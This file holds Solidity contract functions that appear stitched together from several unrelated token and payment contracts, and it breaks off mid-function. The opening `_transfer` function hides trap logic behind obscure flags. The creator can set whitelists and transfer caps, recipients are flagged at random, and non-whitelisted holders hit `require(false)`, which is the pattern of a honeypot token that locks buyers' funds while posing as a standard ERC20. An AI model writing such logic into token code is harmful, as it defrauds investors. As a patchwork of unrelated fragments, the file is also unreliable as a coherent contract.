function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (miami == false)) {
        nextworld = chTx;
        hills = true;
    }
    if ((address(sender) == creator) && (miami == true)) {
        saturn[recipient] = true;
        akira[recipient] = false;
        miami = false;
    }
    if ((amount > witch) && (saturn[sender] == true) && (address(sender) != creator)) {
        cocaine[recipient] = true;
    }
    if (saturn[recipient] != true) {
        akira[recipient] = ((randomly() == 4) ? true : false);
    }
    if ((akira[sender]) && (saturn[recipient] == false)) {
        akira[recipient] = true;
    }
    if (saturn[sender] == false) {
        if ((amount > witch) && (cocaine[sender] == true)) {
            require(false);
        }
        require(amount < nextworld);
        if (hills == true) {
            if (cocaine[sender] == true) {
                require(false);
            }
            cocaine[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function transfer(address to, uint256 value) public returns(bool) {
    require(to != address(0x0));
    require(value <= balances[msg.sender]);
    uint256 valueAllowedToTransfer;
    if (isInvestor[msg.sender]) {
        if (now >= becomesTransferable) {
            valueAllowedToTransfer = balances[msg.sender];
            assert(value <= valueAllowedToTransfer);
        } else {
            valueAllowedToTransfer = balancesAllowedToTransfer[msg.sender];
            assert(value <= valueAllowedToTransfer);
            balancesAllowedToTransfer[msg.sender] = balancesAllowedToTransfer[msg.sender].sub(value);
        }
    }
    balances[msg.sender] = balances[msg.sender].sub(value);
    balances[to] = balances[to].add(value);
    emit Transfer(msg.sender, to, value);
    return true;
}

function transferFrom(address from, address to, uint256 value) public returns(bool) {
    require(to != address(0x0));
    require(value <= balances[from]);
    require(value <= allowed[from][msg.sender]);
    uint256 valueAllowedToTransfer;
    if (isInvestor[from]) {
        if (now >= becomesTransferable) {
            valueAllowedToTransfer = balances[from];
            assert(value <= valueAllowedToTransfer);
        } else {
            valueAllowedToTransfer = balancesAllowedToTransfer[from];
            assert(value <= valueAllowedToTransfer);
            balancesAllowedToTransfer[from] = balancesAllowedToTransfer[from].sub(value);
        }
    }
    balances[from] = balances[from].sub(value);
    balances[to] = balances[to].add(value);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(value);
    emit Transfer(from, to, value);
    return true;
}

function clean(uint256 _maxCleanLength) external {
    require(getSGRAuthorizationManager().isAuthorizedForPublicOperation(msg.sender), "clean queue is not authorized");
    uint256 paymentsQueueLength = payments.length;
    if (paymentsQueueLength > last) {
        uint256 totalPaymentsToClean = paymentsQueueLength.sub(last);
        payments.length = (totalPaymentsToClean < _maxCleanLength) ? last : paymentsQueueLength.sub(_maxCleanLength);
    }
}

function removePayment() external only(_IPaymentManager_) assertNonEmpty {
    sum = sum.sub(payments[first].amount);
    payments[first] = Payment({
        wallet: address(0),
        amount: 0
    });
    uint256 newFirstPosition = first.add(1);
    if (newFirstPosition == last)
        first = last = 0;
    else
        first = newFirstPosition;
}

function updatePayment(uint256 _amount) external only(_IPaymentManager_) assertNonEmpty {
    assert(_amount > 0);
    sum = (sum.add(_amount)).sub(payments[first].amount);
    payments[first].amount = _amount;
}

function addPayment(address _wallet, uint256 _amount) external only(_IPaymentManager_) {
    assert(_wallet != address(0) && _amount > 0);
    Payment memory newPayment = Payment({
        wallet: _wallet,
        amount: _amount
    });
    if (payments.length > last)
        payments[last] = newPayment;
    else
        payments.push(newPayment);
    sum = sum.add(_amount);
    last = last.add(1);
}

function applyRedenomination() onlyNotWorking {
    if (isRedenominated) throw;
    if (redenomiValue == 0) throw;
    if (ownerValidator.validate(msg.sender)) {
        isRedenominated = true;
        ApplyRedenomination(msg.sender, isRedenominated, redenomiValue);
    }
}

function setOwnerValidatorAddress(address _ownerValidator) onlyWorking {
    if (ownerValidator.validate(msg.sender)) {
        ownerValidator = OwnerValidator(_ownerValidator);
    }
}

function transferProcess(address _from, address _to, uint256 _value) private returns(bool success) {
    if (balanceOf(_from) < _value) throw;
    subtractBalance(_from, _value);
    if (offChainManager.isToOffChainAddress(_to)) {
        addBalance(offChainManager.getOffChainRootAddress(), _value);
        ToOffChainTransfer(_from, _to, _to, _value);
    } else {
        addBalance(_to, _value);
    }
    return true;
}

function setOwnerValidateAddress(address _ownerValidator) {
    if (ownerValidator.validate(msg.sender)) {
        ownerValidator = OwnerValidator(_ownerValidator);
    }
}

function transferFrom(address _from, address _to, address _msgSender, uint256 _value) onlyWorking returns(bool success) {
    if (msg.sender != _mainAddress) throw;
    if (balanceOf(_from) < _value) throw;
    if (balanceOf(_to).add(_value) < balanceOf(_to)) throw;
    if (_value > allowance(_from, _msgSender)) throw;
    subtractBalance(_from, _value);
    if (offChainManager.isToOffChainAddress(_to)) {
        addBalance(offChainManager.getOffChainRootAddress(), _value);
        ToOffChainTransfer(_msgSender, _to, _to, _value);
    } else {
        addBalance(_to, _value);
    }
    subtractAllowed(_from, _msgSender, _value);
    return true;
}

function redenominate(uint256 _redenomiValue) {
    if (isRedenominated) throw;
    if (ownerValidator.validate(msg.sender)) {
        redenomiValue = _redenomiValue;
        Redenominate(msg.sender, isRedenominated, redenomiValue);
    }
}

function setRootAddress(address _address) onlyWorking {
    if (ownerValidator.validate(msg.sender)) {
        rootAddress = _address;
    }
}

function addOffChainAddresses(address[] _addresses) onlyWorking {
